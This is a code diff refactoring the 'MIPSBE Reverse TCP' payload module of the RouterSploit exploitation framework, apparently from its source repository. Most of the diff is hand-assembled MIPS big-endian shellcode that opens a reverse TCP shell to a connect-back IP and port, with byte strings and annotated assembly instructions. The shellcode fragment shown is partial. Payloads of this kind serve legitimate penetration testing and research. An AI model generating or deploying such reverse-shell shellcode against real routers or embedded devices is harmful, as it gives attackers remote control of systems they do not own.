@@ -1,12 +1,12 @@
-from routersploit import (
-    exploits,
-    payloads,
-    validators,
-    random_text
+from routersploit import validators
+from routersploit.payloads import (
+    ArchitectureSpecificPayload,
+    Architectures,
+    ReverseTCPPayloadMixin,
 )
 
 
-class Exploit(payloads.Payload):
+class Exploit(ArchitectureSpecificPayload, ReverseTCPPayloadMixin):
     __info__ = {
         'name': 'MIPSBE Reverse TCP',
         'authors': [
@@ -18,13 +18,7 @@ class Exploit(payloads.Payload):
         ],
     }
 
-    architecture = "mipsbe"
-    handler = "reverse_tcp"
-    lhost = exploits.Option('', 'Connect-back IP address', validators=validators.ipv4)
-    lport = exploits.Option(5555, 'Connect-back TCP Port', validators=validators.integer)
-
-    output = exploits.Option('python', 'Output type: elf/c/python')
-    filepath = exploits.Option("/tmp/{}".format(random_text(8)), 'Output file to write')
+    architecture = Architectures.MIPSBE
 
     def generate(self):
         reverse_ip = validators.convert_ip(self.lhost)
@@ -52,10 +46,10 @@ class Exploit(payloads.Payload):
             "\x24\x02\x0f\xc9" +            # li       v0,4041
             "\x01\x09\x09\x0c" +            # syscall  0x42424
             "\x3c\x05\x00\x02" +            # lui      a1,0x2
-            "\x34\xa5" + reverse_port +     # "\x7a\x69"  # ori      a1,a1,0x7a69
+            "\x34\xa5" + reverse_port +     # "\x7a\x69"  # ori   a1,a1,0x7a69
             "\xaf\xa5\xff\xf8" +            # sw       a1,-8(sp)
-            "\x3c\x05" + reverse_ip[:2] +   # "\xc0\xa8"  # lui      a1,0xc0a8
-            "\x34\xa5" + reverse_ip[2:] +   # "\x01\x37"  # ori      a1,a1,0x137
+            "\x3c\x05" + reverse_ip[:2] +   # "\xc0\xa8"  # lui   a1,0xc0a8
+            "\x34\xa5" + reverse_ip[2:] +   # "\x01\x37"  # ori   a1,a1,0x137
             "\xaf\xa5\xff\xfc" +            # sw       a1,-4(sp)
             "\x23\xa5\xff\xf8" +            # addi     a1,sp,-8
             "\x24\x0c\xff\xef" +            # li       t4,-17
